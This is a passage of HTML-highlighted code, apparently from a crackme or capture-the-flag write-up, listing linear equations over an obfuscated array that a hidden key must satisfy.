operator\">-</span> <span class=\"token number\">55</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">229</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">26</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">65</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">29</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">2107</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">10</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token operator\">-</span><span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">22</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">21</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">22</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">4037</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">15</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">59</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">56</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">66</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">122</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">21</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">32</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">4950</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">13</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">66</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">29</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">39</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">33</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">42</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">62</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">12544</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">23</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">29</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">63</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">25</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">32</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">6585</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">223</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">29</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">53</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">65</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">36</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">6893</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">29</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">93</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">33</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">65</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">36</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">96</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">68</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">33</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">1883</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">69</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">77</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">93</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">36</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">66</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">38</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">8257</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">23</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">68</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">68</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">26</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">5847</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">24</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">67</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">146</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">50</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">69</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">27</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">45</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">18257</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">25</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">26</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">89</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">44</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">36</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span 